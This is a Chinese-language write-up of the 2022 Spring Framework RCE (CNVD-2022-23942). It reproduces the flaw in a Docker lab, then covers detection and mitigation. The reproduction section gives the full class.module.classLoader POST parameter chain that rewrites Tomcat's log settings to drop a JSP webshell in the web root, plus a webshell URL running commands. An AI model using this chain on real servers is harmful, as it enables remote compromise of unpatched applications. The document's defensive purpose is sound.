@@ -1,0 +1,167 @@
+**一、漏洞描述：**
+
+2022.3.30，Spring框架曝出RCE
+0day漏洞，国家信息安全漏洞共享平台（CNVD）已收录了Spring框架远程命令执行漏洞（CNVD-2022-23942），考虑到Spring框架的广泛应用，漏洞被评级为危险。
+
+通过该漏洞可写入webshell，可命令执行。在Spring框架的JDK9版本(及以上版本)中，远程攻击者可在满足特定条件的基础上，通过框架的参数绑定功能获取AccessLogValve对象并诸如恶意字段值，从而触发pipeline机制并
+写入任意路径下的文件。
+
+漏洞触发条件如下：
+
+使用JDK9及以上版本的Spring MVC框架
+
+Spring框架以及衍生的框架spring-beans-*.jar文件或者存在
+
+CachedIntrospectionResults.class
+
+漏洞影响版本如下：
+
+jdk版本在9及以上的使用了版本低于5.3.18和5.2.20的Spring框架或其衍生框架构建的网站或应用
+
+ **二、SpringCore RCE漏洞复现：**
+
+使用docker搭建SpringCore RCE测试环境，这里使用vulfocus提供的，大概几百M
+
+docker pull vulfocus/spring-core-rce-2022-03-29:latest
+
+在8888端口上开启spring，环境中要基于tomcat，这里tomcat是Spring自带的中间件
+
+docker run -p 8888:8080 --name vulnerable-app vulnerable-app
+
+![1648712208_62455a10b46439dfd6a61.png!small](https://image.3001.net/images/20220331/1648712208_62455a10b46439dfd6a61.png!small)
+
+直接访问docker中的测试环境，返回ok，证明系统启动成功
+
+![1648712223_62455a1fbe0c48041d05e.png!small](https://image.3001.net/images/20220331/1648712223_62455a1fbe0c48041d05e.png!small)
+
+通过网上公布的POC，主要是利⽤class对象构造利⽤链，对Tomcat的⽇志配置进行修改，然后，向⽇志中写⼊shell。
+
+利用方法非常简单，该漏洞真的是⼀个核弹级别的漏洞，因为，我们很简单的就可以获取到class对象，那剩下的就是利⽤这个class对象构造利⽤链，修改Tomcat的⽇志配置，向⽇志中写⼊shell。⼀条完整的利⽤链如下：
+
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69
+
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d%79%4a%61%76%61%43%6f%64%65%5c%73%74%75%70%69%64%52%7
+
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp
+
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+利⽤链是⼀个修改Tomcat⽇志配置操作，再利⽤⽇志写入shell。
+
+具体的攻击步骤如下，先后发送以上5个利用链的请求，我这里使用POST一次发送，因为，分布依次发送，有时会导致Spring出问题，系统出错。
+
+1、发送POST数据包如下：
+
+数据包格式Content-Type:application/x-www-form-urlencoded
+
+POST数据包
+
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring-core-rce-test（写入shell内容）
+
+&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp（修改tomcat配置日志文件后缀jsp）
+
+&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT（写入shell在网站根目录）
+
+&class.module.classLoader.resources.context.parent.pipeline.first.prefix=myshell（写入shell文件名称）&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+发送数据包截图，如下图所示：
+
+![1648712240_62455a308d67a269413a8.png!small](https://image.3001.net/images/20220331/1648712240_62455a308d67a269413a8.png!small)
+
+成功写入shell文件myshell.jsp到网站根目录，如下图所示：
+
+![1648712252_62455a3c4b47c17691cd3.png!small](https://image.3001.net/images/20220331/1648712252_62455a3c4b47c17691cd3.png!small)
+
+进一步写入webshell到网站根目录，POST数据包如下：
+
+![1648712263_62455a4705eeb067fbe23.png!small](https://image.3001.net/images/20220331/1648712263_62455a4705eeb067fbe23.png!small)
+
+Webshell内容简单的命令执行，密码是j，命令执行内容显示“----shell--rce----”前面
+
+[http://192.168.32.168:8888/myshell.jsp?pwd=j&cmd=id](http://192.168.32.168:8888/myshell.jsp?pwd=j&cmd=id)
+
+![1648712274_62455a5257ef86667b7d5.png!small](https://image.3001.net/images/20220331/1648712274_62455a5257ef86667b7d5.png!small)
+
+ **三、SpringCore RCE漏洞影响排查方法：**
+
+(一)、JDK版本号排查
+
+在业务系统的运行服务器上，执行“java -version”命令查看运行的JDK版本，如果版本号小于等于8，则不受漏洞影响
+
+(二)、Spring框架使用情况排查
+
+1、如果业务系统项目以war包形式部署，按照如下步骤进行判断。
+
+⑴解压war包：将war文件的后缀修改成.zip ,解压zip文件
+
+⑵在解压缩目录下搜索是否存在 spring-beans-*.jar 格式的jar文件（例如spring-beans-5.3.16.jar）,如存在则说明业务系统使用了spring框架进行开发。
+
+⑶如果spring-beans-*.jar 文件不存在，则在解压缩目录下搜索CachedIntrospectionResuLts.class
+文件是否存在，如存在则说明业务系统使用了Spring框架开发。
+
+2、如果业务系统项目以jar包形式直接独立运行，按照如下步骤进行判断。
+
+⑴解压jar包：将jar文件的后缀修改成.zip,解压zip文件。
+
+⑵在解压缩目录下搜索是否存在spring-beans-*.jar 格式的jar文件（例如spring-beans-5.3.16.jar）,如存在则说明业务系统使用了spring框架进行开发。
+
+⑶如果spring-beans-*.jar 文件不存在，则在解压缩目录下搜索CachedIntrospectionResuLts.class
+文件是否存在，如存在则说明业务系统使用了spring框架进行开发。
+
+(三)、综合判断
+
+在完成以上两个步骤排查后，同时满足以下两个条件可确定受此漏洞影响：
+
+⑴JDK版本号在9及以上的；
+
+⑵使用了spring框架或衍生框架。
+
+ **四、SpringCore RCE漏洞安全建议**
+
+目前，Spring官方已发布新版本完成漏洞修复，CNVD建议受漏洞影响的产品（服务）厂商和信息系统运营者尽快进行自查，并及时升级至最新版本：
+
+<https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement>
+
+也可以采用以下二个临时方案进行防护
+
+(一）、WAF防护
+
+在WAF等网络防护设备上，根据实际部署业务的流量情况，实现对“class.*”“Class.*”“*.class.*”“*.Class.*”等字符串的规则过滤，并在部暑过滤规则后，对业务运行情况进行测试，避免产生额外影响。
+
+(二）、临时修复措施
+
+需同时按以下两个步骤进行漏涧的临时修复:
+
+1.在应用中全局搜索@InitBinder注解，看看方法体内是否调用dataBinder.setDisallowedFields方法，如果发现此代码片段的引入，则在原来的黑名单中，添加{"class.*","Class.
+*","*. class.*", "*.Class.*"}。(注:如果此代码片段使用较多,需要每个地方都追加)
+
+2.在应用系统的项目包下新建以下全局类，并保证这个类被Spring 加载到(推荐在Controller
+所在的包中添加).完成类添加后，需对项目进行重新编译打包和功能验证测试。并重新发布项目。
+
+import org.springframework.core.annotation.Order;
+
+import org.springframework.web.bind.WebDataBinder;
+
+import org.springframework.web.bind.annotation.ControllerAdvice;
+
+import org.springframework.web.bind.annotation.InitBinder;
+
+@ControllerAdvice
+
+@Order(10000)
+
+public class a{
+
+@InitBinder
+
+public void setAllowedFields(WebDataBinder dataBinder) {
+
+String[] abd = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
+
+dataBinder.setDisallowedFields(abd);
+
+}
+
+}
+
